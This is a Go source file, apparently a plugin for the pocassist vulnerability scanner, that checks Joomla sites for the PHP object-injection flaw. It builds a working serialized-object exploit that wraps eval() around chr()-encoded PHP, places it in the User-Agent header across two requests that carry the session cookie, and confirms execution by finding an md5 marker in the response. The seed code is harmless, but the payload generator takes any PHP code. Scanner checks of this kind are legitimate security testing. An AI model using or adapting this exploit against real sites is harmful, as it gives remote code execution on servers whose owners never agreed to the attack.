package scripts

import (
	"bytes"
	"fmt"
	"github.com/jweny/pocassist/pkg/cel/proto"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
	"net/http"
	"strings"
)

func phpStringNoQuotes(data string) string {
	parts := make([]string, 0, len(data))
	for _, r := range data {
		parts = append(parts, fmt.Sprintf("chr(%d)", r))
	}
	return strings.Join(parts, ".")
}

func generateJoomlaPayload(seed string) string {
	phpPayload := "eval(" + phpStringNoQuotes(seed) + ")"
	terminate := "\xf0\xfd\xfd\xfd"
	injectedPayload := phpPayload + ";JFactory::getConfig();exit"
	exploitTemplate := `}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";`
	exploitTemplate += fmt.Sprintf(`s:%v:"%v"`, len(injectedPayload), injectedPayload)
	exploitTemplate += `;s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}` + terminate
	return exploitTemplate
}

// JoomlaSerialization joomla 序列化执行
func JoomlaSerialization(args *ScriptScanArgs) (*util.ScanResult, error) {

	// 定义报文列表
	var respList []*proto.Response

	payload := generateJoomlaPayload("print_r(md5(1224121));")
	rawUrl := ConstructUrl(args, "/")

	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)

	// 第一次请求，获取 cookie
	fastReq.SetRequestURI(rawUrl)
	fastReq.Header.SetUserAgent(payload)
	fastReq.Header.SetMethod(http.MethodGet)

	resp1, err := util.DoFasthttpRequest(fastReq, false)
	if err != nil {
		util.ResponsePut(resp1)
		return nil, err
	}

	fastReq.Reset()

	// 第二次请求，带上cookie
	fastReq.SetRequestURI(rawUrl)
	fastReq.Header.SetUserAgent(payload)
	fastReq.Header.SetMethod(http.MethodGet)

	for key, value := range resp1.Headers{
		cookie := fasthttp.AcquireCookie()
		defer fasthttp.ReleaseCookie(cookie)
		err := cookie.Parse(value)
		if err == nil {
			fastReq.Header.SetCookie(key, string(cookie.Value()))
		}
	}

	resp2, err := util.DoFasthttpRequest(fastReq,true)
	if err != nil {
		util.ResponsePut(resp2)
		return nil, err
	}
	if bytes.Contains(resp2.Body, []byte("aaf4d47f7a0c6ab77b7ae23a7c7d78af")) {
		respList = append(respList, resp1)
		respList = append(respList, resp2)
		return util.VulnerableHttpResult(rawUrl, "", respList),nil
	}
	util.ResponsePut(resp1)
	util.ResponsePut(resp2)

	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-joomla-serialization", JoomlaSerialization)
}
